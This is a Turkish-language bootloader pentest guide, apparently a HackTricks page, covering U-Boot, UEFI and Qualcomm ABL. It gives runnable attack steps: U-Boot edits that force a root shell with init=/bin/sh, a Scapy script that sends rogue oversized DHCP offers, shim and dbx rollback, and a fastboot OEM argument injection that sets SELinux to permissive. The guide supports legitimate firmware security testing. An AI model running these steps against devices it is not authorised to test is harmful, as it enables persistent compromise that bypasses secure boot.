# Bootloader Testi

{{#include ../../banners/hacktricks-training.md}}

Aşağıdaki adımlar, cihaz başlangıç yapılandırmalarını değiştirmek ve U-Boot ile UEFI sınıfı loader'lar gibi bootloader'ları test etmek için önerilir. Erken aşamada code execution elde etmeye, signature/rollback korumalarını değerlendirmeye ve recovery veya network-boot yollarını kötüye kullanmaya odaklanın.

İlgili: bl2_ext patching üzerinden MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot hızlı kazanımları ve environment kötüye kullanımı

1. Interpreter shell'e erişin
- Boot sırasında, `bootcmd` çalışmadan önce bilinen bir break tuşuna (genellikle herhangi bir tuş, 0, boşluk veya board'a özel bir "magic" sequence) basarak U-Boot prompt'una düşün.

2. Boot durumunu ve değişkenleri inceleyin
- Kullanışlı komutlar:
- `printenv` (environment dökümü)
- `bdinfo` (board bilgisi, memory adresleri)
- `help bootm; help booti; help bootz` (desteklenen kernel boot yöntemleri)
- `help ext4load; help fatload; help tftpboot` (kullanılabilir loader'lar)

3. Root shell elde etmek için boot argümanlarını değiştirin
- Kernel'in normal init yerine shell'e düşmesi için `init=/bin/sh` ekleyin:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP server'ınızdan Netboot yapın
- Ağı yapılandırın ve LAN üzerinden bir kernel/fit image alın:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Değişiklikleri environment üzerinden kalıcı hâle getirin
- Env storage write-protected değilse control'ü kalıcı hâle getirebilirsiniz:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Fallback yollarını etkileyen `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi değişkenleri kontrol edin. Hatalı yapılandırılmış değerler shell'e tekrar tekrar break edilmesini sağlayabilir.

6. Debug/unsafe özellikleri kontrol edin
- Şunları arayın: `bootdelay` > 0, `autoboot` devre dışı, kısıtlanmamış `usb start; fatload usb 0:1 ...`, serial üzerinden `loady`/`loads` kullanabilme, güvenilmeyen media'dan `env import` ve signature checks olmadan yüklenen kernel/ramdisk'ler.

7. U-Boot image/verification testi
- Platform secure/verified boot özelliğinin FIT image'larıyla kullanıldığını iddia ediyorsa hem unsigned hem de değiştirilmiş image'ları deneyin:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # FIT sig enforced ise FAIL olmalı
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # FAIL olmalı
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # yalnızca key trusted ise boot etmeli
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` bulunmaması veya legacy `verify=n` davranışı çoğu zaman arbitrary payload'ların boot edilmesine izin verir.
- Basit bir allow/deny sonucu ile yetinmeyin: Güncel FIT araştırmaları, verification path'in kendisinin pre-auth attack surface olabileceğini gösterdi. Harici olarak depolanan FIT data'sını (`data-offset`, `data-position`, `data-size`), signed configuration selection'ı, `loadables`'ı ve overlay / `extra-conf` işleme mantığını negative-test edin.
- Eşleşen bir source tree'ye sahipseniz, gerçek hardware'e dokunmadan önce U-Boot sandbox'ta FIT verification behaviour'ı yeniden üretmek için `test/vboot/vboot_test.sh` hızlı bir yöntemdir.

8. Standard Boot (`bootstd`), `extlinux` ve script bootflow'ları
- Modern U-Boot build'lerinde `bootcmd` çoğu zaman Standard Boot etrafında yalnızca bir wrapper'dır. Bu, görünür environment zararsız görünse bile writable media, PXE veya SPI flash'ın gerçek trust boundary hâline gelebileceği anlamına gelir.
- `extlinux` bootmeth, `/` ve `/boot` altında `extlinux/extlinux.conf` dosyasını arar; script bootmeth önce `boot.scr.uimg`, ardından `boot.scr` dosyasını arar. Network boot sırasında script filename `boot_script_dhcp` üzerinden gelebilir.
- Kullanışlı triage komutları:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Test edilmesi gereken abuse case'leri: `boot_targets` içinde daha öncelikli attacker-controlled USB/SD media, writable `/boot/extlinux/extlinux.conf`, `boot.scr` sağlayan rogue TFTP veya `script_offset_f` üzerinden SPI-backed script execution.
- Platform FIT verification'a dayanıyorsa configuration'ların yalnızca image başına değil, configuration seviyesinde imzalandığından emin olun; `required-mode=all`, herhangi bir tek required key'i kabul etmekten daha güçlüdür.

## Network-boot surface (DHCP/PXE) ve rogue server'lar

9. PXE/DHCP parameter fuzzing
- U-Boot'un legacy BOOTP/DHCP işleme mantığında memory-safety sorunları görülmüştür. Örneğin CVE‑2024‑42040, crafted DHCP response'ları üzerinden U-Boot memory'sinden byte'ların wire üzerinden geri leak edilmesine yol açabilen memory disclosure'ı tanımlar. DHCP/PXE code path'lerini aşırı uzun veya edge-case değerlerle (option 67 bootfile-name, vendor option'ları, file/servername alanları) exercise edin ve hang/leak durumlarını gözlemleyin.
- Netboot sırasında boot parametrelerini stres test etmek için minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- PXE filename alanlarının OS-side provisioning script'lerine chain edildiğinde sanitization olmadan shell/loader logic'e aktarılıp aktarılmadığını da doğrulayın.

10. Rogue DHCP server command injection testi
- Rogue bir DHCP/PXE service kurun ve boot chain'in sonraki aşamalarında command interpreter'lara ulaşmak için filename veya option alanlarına karakter enjekte etmeyi deneyin. Metasploit'in DHCP auxiliary'si, `dnsmasq` veya custom Scapy script'leri iyi çalışır. Önce lab network'ünü izole ettiğinizden emin olun.

## Normal boot'u override eden SoC ROM recovery mode'ları

Birçok SoC, flash image'ları geçersiz olsa bile USB/UART üzerinden code kabul eden bir BootROM "loader" mode'u sunar. Secure-boot fuse'ları yakılmamışsa bu, chain'in çok erken bir aşamasında arbitrary code execution sağlayabilir.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) veya `imx-usb-loader`.
- Örnek: RAM üzerinden custom U-Boot push edip çalıştırmak için `imx-usb-loader u-boot.imx`.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Örnek: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Örnek: bir loader stage etmek ve custom U-Boot upload etmek için `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`.

Cihazda secure-boot eFuse/OTP değerlerinin yakılıp yakılmadığını değerlendirin. Yakılmamışlarsa BootROM download mode'ları, first-stage payload'ınızı doğrudan SRAM/DRAM üzerinden çalıştırarak çoğu zaman daha üst seviyedeki verification'ları (U-Boot, kernel, rootfs) bypass eder.

## UEFI/PC sınıfı bootloader'lar: hızlı kontroller

11. ESP tampering, rollback ve key-enrollment testi
- EFI System Partition'ı (ESP) mount edin ve loader component'lerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo path'leri.
- Mümkün olduğunda OS üzerinden Secure Boot state'ini ve key database'lerini dump edin:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Platform Setup Mode'daysa, unauthenticated key enrollment kabul ediyorsa veya test/default Platform Key (PKfail class) ile geliyorsa local admin ya da physical attacker kendi KEK/db'sini enroll edebilir ve arbitrary EFI binary'lerini boot ederken Secure Boot'u “enabled” gibi gösterebilir.
- Secure Boot revocation'ları (dbx) güncel değilse downgraded veya bilinen vulnerable signed boot component'leriyle boot etmeyi deneyin. Platform hâlâ eski shim/bootmanager'lara güveniyorsa persistence elde etmek için çoğu zaman ESP'den kendi kernel'inizi veya `grub.cfg` dosyanızı yükleyebilirsiniz.

12. Stale shim / SBAT / dbx revocation testi
- Eski Microsoft-signed shim'ler ve vendor fork'ları, revocation'lar güncel değilse BYOVD-style bootkit path olarak hâlâ kullanılabilir. İzole bir lab ortamında ESP'ye tarihsel olarak vulnerable bir shim yerleştirin ve kendi `grubx64.efi` dosyanızı veya kernel'inizi chainload etmeyi deneyin.
- Hızlı triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Shim revocation list'te olmasına rağmen hâlâ çalışıyorsa firmware/OS'un stale `dbx` update'leri vardır veya upstream SBAT protections'ı hiç devralmamış forked bir loader'a güveniyordur.

13. Boot logo parsing bug'ları (LogoFAIL class)
- Birkaç OEM/IBV firmware, boot logo'larını işleyen DXE'deki image-parsing flaw'larına karşı vulnerable durumdaydı. Bir attacker vendor-specific bir path altında ESP'ye crafted bir image (ör. `\EFI\<vendor>\logo\*.bmp`) yerleştirebilir ve reboot edebilirse Secure Boot enabled olsa bile early boot sırasında code execution mümkün olabilir. Platformun user-supplied logo'ları kabul edip etmediğini ve bu path'lerin OS üzerinden writable olup olmadığını test edin.


## Android/Qualcomm ABL + GBL (Android 16) trust gap'leri

Qualcomm'un **Generic Bootloader Library (GBL)** yüklemek için ABL kullanan Android 16 cihazlarda, ABL'nin `efisp` partition'ından yüklediği UEFI app'i **authenticate** edip etmediğini doğrulayın. ABL yalnızca bir UEFI app'in **presence** durumunu kontrol ediyor ve signature'ları verify etmiyorsa `efisp` için bir write primitive, boot sırasında **pre-OS unsigned code execution** hâline gelir.

Practical checks ve abuse path'leri:

- **efisp write primitive**: `efisp` içine custom bir UEFI app yazmanın bir yoluna ihtiyacınız vardır (root/privileged service, OEM app bug'ı, recovery/fastboot path'i). Bu olmadan GBL loading gap'ine doğrudan erişilemez.
- **fastboot OEM argument injection** (ABL bug'ı): Bazı build'ler `fastboot oem set-gpu-preemption` komutunda extra token'ları kabul eder ve bunları kernel cmdline'a ekler. Bu, protected partition write'larını etkinleştirerek permissive SELinux'u zorlamak için kullanılabilir:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Cihaz patch'lenmişse komut extra argument'ları reddetmelidir.
- **Persistent flag'ler üzerinden bootloader unlock**: Bir boot-stage payload, OEM server/approval gate'leri olmadan `fastboot oem unlock` davranışını taklit etmek için persistent unlock flag'lerini (ör. `is_unlocked=1`, `is_unlocked_critical=1`) değiştirebilir. Bu, bir sonraki reboot sonrasında kalıcı bir posture değişikliğidir.

Defensive/triage notları:

- ABL'nin `efisp` üzerinden gelen GBL/UEFI payload'ı üzerinde signature verification yapıp yapmadığını doğrulayın. Yapmıyorsa `efisp`'i high‑risk persistence surface olarak değerlendirin.
- ABL fastboot OEM handler'larının **argument count'larını validate** edecek ve additional token'ları reddedecek şekilde patch'lenip patch'lenmediğini takip edin.

## Hardware uyarısı

Early boot sırasında SPI/NAND flash ile etkileşime girerken (ör. read'leri bypass etmek için pin'leri ground'larken) dikkatli olun ve her zaman flash datasheet'ine başvurun. Zamanlaması hatalı short'lar cihaza veya programmer'a zarar verebilir.

## Notlar ve ek ipuçları

- Environment blob'larını RAM ve storage arasında taşımak için `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` komutlarını deneyin; bazı platformlar removable media'dan authentication olmadan env import edilmesine izin verir.
- `extlinux.conf` üzerinden boot eden Linux tabanlı sistemlerde, signature checks uygulanmıyorsa boot partition'daki `APPEND` satırını değiştirmek (`init=/bin/sh` veya `rd.break` enjekte etmek) çoğu zaman yeterlidir.
- Target dual-slot / A/B update kullanıyorsa, bootloader'ın dışındaki updater-only trust gap'lerini kaçırmamak için [firmware analysis overview](README.md) içindeki anti-rollback ve slot-desync tekniklerini inceleyin.
- Userland `fw_printenv/fw_setenv` sağlıyorsa `/etc/fw_env.config` dosyasının gerçek env storage ile eşleştiğini doğrulayın. Hatalı offset'ler yanlış MTD region'ını read/write etmenize izin verir.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
